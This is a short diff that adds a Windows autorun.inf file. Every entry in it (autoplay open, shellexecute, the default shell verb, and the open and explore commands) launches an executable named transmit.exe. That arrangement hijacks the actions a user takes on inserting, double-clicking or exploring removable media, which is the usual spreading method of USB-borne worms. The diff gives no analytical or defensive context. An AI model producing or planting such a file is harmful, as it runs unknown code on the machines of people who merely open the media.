@@ -1,0 +1,7 @@
+[autorun]
+open=transmit.exe
+shellexecute=transmit.exe
+shell\Auto\command=transmit.exe
+shell=Auto
+shell\open\command=transmit.exe
+shell\explore\command=transmit.exe
